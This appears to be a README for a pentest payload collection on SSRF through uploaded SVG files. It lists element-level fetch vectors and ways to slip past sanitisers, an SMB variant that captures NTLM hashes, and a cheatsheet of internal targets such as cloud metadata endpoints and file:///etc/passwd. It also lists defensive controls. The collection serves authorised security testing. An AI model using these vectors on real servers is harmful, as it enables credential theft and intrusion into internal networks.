# SSRF Payloads

Payloads for testing **Server-Side Request Forgery via SVG file upload**. When a server-side library processes an uploaded SVG (to render, convert, resize, or sanitise it), external URLs embedded in the SVG are fetched by the server. Each payload uses a unique subdomain label so OOB callbacks can be correlated to the exact SVG element that triggered the fetch.

---

## Attack Surface

SVG files are XML and support numerous mechanisms for referencing external resources. SSRF occurs when the server passes an uploaded SVG to any of:

- Image processing libraries: **ImageMagick**, **librsvg**, **Inkscape**, **Cairo**, **Batik**
- HTML-to-PDF converters: **wkhtmltopdf**, **WeasyPrint**, **PhantomJS**, **Puppeteer**
- Document converters: **LibreOffice**, **unoconv**, **Pandoc**
- Thumbnail generators, preview renderers, antivirus scanners

The request originates from the **server's IP**, enabling:
- Internal network enumeration and port scanning
- Access to cloud metadata endpoints (AWS `169.254.169.254`, GCP, Azure)
- Bypass of network controls that only restrict browser-side requests
- NTLM credential capture on Windows servers (SMB variant)

> These payloads are SVG-only. For SSRF via PDF actions (`/ImportData`, `/GoToR`, `/Rendition`) see [`../Open Redirect/`](../Open%20Redirect/).

---

## URL Template Placeholders

Every payload uses three placeholders. Replace before use:

| Placeholder | Replace with | Example |
|---|---|---|
| `TARGET_SCHEME` | Protocol | `http`, `https`, `file`, `gopher`, `ftp` |
| `TARGET_DOMAIN` | OOB callback domain (Burp Collaborator / interactsh) | `xyz.oastify.com` |
| `TARGET_PORT` | Port to probe | `80`, `443`, `8080`, `22`, `6379` |

Each payload also includes a **unique subdomain prefix** (e.g., `ssrf-svg-feimage-xlink-href.TARGET_DOMAIN`) so DNS/HTTP logs identify which specific SVG element caused the callback without ambiguity.

---

## Payload Index

### Direct Image Fetch

| File | SVG Element / Attribute | Notes |
|---|---|---|
| `ssrf-image-href.svg` | `<image href="...">` | SVG 2.0 `href` attribute — supported by modern renderers |
| `ssrf-image-xlink-href.svg` | `<image xlink:href="...">` | SVG 1.1 `xlink:href` — the most widely supported variant; test this first |
| `ssrf-feimage-xlink-href.svg` | `<feImage xlink:href="...">` | SVG filter primitive — fetched when the filter is applied during rendering; may bypass sanitisers that check element names but not filter primitives |

---

### Fill URL References

| File | SVG Element / Attribute | Notes |
|---|---|---|
| `ssrf-rect-fill.svg` | `<rect fill="url(http://...)">` | CSS `fill` property with an external URL reference — applies to any shape element |
| `ssrf-path-fill.svg` | `<path fill="url(http://...)">` | Same technique on a `<path>` element |
| `ssrf-rect-fill-smb.svg` | `<rect fill="url(\\\\host\smbshare\)">` | **UNC/SMB path** — on Windows servers causes an SMB connection, leaking the server's NTLM hash to a responder listener |

---

### Pattern Definition

| File | SVG Element / Attribute | Notes |
|---|---|---|
| `ssrf-pattern-image-xlink-href.svg` | `<pattern><image xlink:href="...">` | Image embedded inside a `<defs>` pattern — the fetch may be deferred to render time; tests whether sanitisers process content inside `<defs>` |

---

### foreignObject (HTML Embedding)

| File | Embedded Element | Notes |
|---|---|---|
| `ssrf-foreignobject-img-src.svg` | `<foreignObject><img src="...">` | HTML `<img>` embedded in SVG via `foreignObject` with XHTML namespace — triggers a resource fetch if the renderer processes XHTML content |
| `ssrf-foreignobject-iframe-src.svg` | `<foreignObject><iframe src="...">` | HTML `<iframe>` embedded in SVG — wider URL support than `<img>`; effective in browser-based renderers (wkhtmltopdf, Puppeteer) |

---

### CSS-Based Vectors

CSS vectors are often missed by sanitisers that check SVG element names but do not parse inline style content.

| File | CSS Mechanism | Notes |
|---|---|---|
| `ssrf-style-import.svg` | `<style>@import url("...")</style>` | CSS `@import` in a plain `<style>` block |
| `ssrf-style-cdata-import-url.svg` | `<style><![CDATA[@import url("...")]]></style>` | Same `@import` but inside a CDATA section — bypasses regex scanners that look for `url(` outside CDATA |
| `ssrf-style-cdata-font-src.svg` | `<style><![CDATA[@font-face { src: url("...") }]]></style>` | CSS `@font-face src:` — font loading fetch; particularly effective in PDF renderers that load web fonts |
| `ssrf-link-href.svg` | `<link rel="stylesheet" href="...">` | XHTML `<link>` element in the SVG document (XHTML namespace) — behaves like a CSS `@import` in hybrid SVG/HTML contexts |

---

### xlink:href on SVG Text & Shape Elements

| File | SVG Element | Notes |
|---|---|---|
| `ssrf-use-xlink-href.svg` | `<use xlink:href="...">` | Imports and renders an external SVG symbol — common in icon systems; widely supported |
| `ssrf-textpath-xlink-href.svg` | `<textPath xlink:href="...">` | `<textPath>` references a path by URL — unusual vector that some sanitisers miss |
| `ssrf-tref-xlink-href.svg` | `<tref xlink:href="...">` | SVG 1.1 `<tref>` element (deprecated in SVG 2.0) — fetches text content from an external resource; supported by Batik and older renderers |

---

### XML-Level Vectors

| File | Mechanism | Notes |
|---|---|---|
| `ssrf-xi-include.svg` | `<xi:include href="..." parse="text">` | **XInclude** — standard XML inclusion mechanism; causes the XML parser itself to fetch and inline the resource *before* SVG rendering begins. Effective against any XML-aware parser. `parse="text"` returns response body as text content. |
| `ssrf-xml-stylesheet.svg` | `<?xml-stylesheet type="text/css" href="...">` | XML processing instruction — fetched by the XML parser when loading the document, before any SVG-specific processing; bypasses SVG-specific sanitisers entirely |

---

## Vector Selection Guide

| Scenario | Best payloads to try first |
|---|---|
| Unknown renderer | `ssrf-image-xlink-href.svg`, `ssrf-xml-stylesheet.svg`, `ssrf-xi-include.svg` |
| ImageMagick | `ssrf-image-xlink-href.svg`, `ssrf-rect-fill.svg`, `ssrf-feimage-xlink-href.svg` |
| wkhtmltopdf / Puppeteer | `ssrf-foreignobject-iframe-src.svg`, `ssrf-style-import.svg`, `ssrf-image-href.svg` |
| Batik (Java) | `ssrf-tref-xlink-href.svg`, `ssrf-use-xlink-href.svg`, `ssrf-xi-include.svg` |
| librsvg | `ssrf-image-href.svg`, `ssrf-style-cdata-font-src.svg`, `ssrf-link-href.svg` |
| Sanitiser bypass | `ssrf-feimage-xlink-href.svg`, `ssrf-style-cdata-import-url.svg`, `ssrf-pattern-image-xlink-href.svg` |
| Windows server (NTLM) | `ssrf-rect-fill-smb.svg` |

---

## Internal Target Cheatsheet

Once SSRF is confirmed via OOB callback, replace `TARGET_SCHEME://TARGET_DOMAIN:TARGET_PORT/` with an internal target:

| Target | URL |
|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` |
| AWS IMDSv2 token | `http://169.254.169.254/latest/api/token` |
| GCP metadata | `http://metadata.google.internal/computeMetadata/v1/` |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| Localhost web | `http://127.0.0.1/` |
| Internal subnet | `http://10.0.0.1/`, `http://192.168.1.1/` |
| Redis | `http://127.0.0.1:6379/` |
| Elasticsearch | `http://127.0.0.1:9200/` |
| Kubernetes API | `https://10.96.0.1:443/api/v1/` |
| Local file read | `file:///etc/passwd` |

---

## What to Test For

| Control | Passes if… |
|---|---|
| SVG sanitisation strips external references | All `href`, `xlink:href`, `src`, and `fill="url(...)"` attributes pointing to non-data URIs are removed |
| XML processing instructions blocked | `<?xml-stylesheet?>` PIs are stripped before parsing |
| XInclude disabled | `xi:include` elements are rejected or the XML parser has XInclude disabled |
| foreignObject stripped | `<foreignObject>` elements are removed entirely |
| CDATA style content parsed and sanitised | Inline CSS inside `<![CDATA[...]]>` is inspected, not passed through raw |
| Renderer network access restricted | Server-side renderer runs without network access or behind an egress firewall |
| SSRF allowlist enforced | Renderer can only fetch from an explicit allowlist of trusted origins |

---

## Related Sections

- [`../Open Redirect/`](../Open%20Redirect/) — PDF-based SSRF via `/ImportData`, `/Rendition`, `/GoToR`, and `/Sound` actions
- [`../XSS/`](../XSS/) — SVG payloads focused on script execution rather than outbound fetch
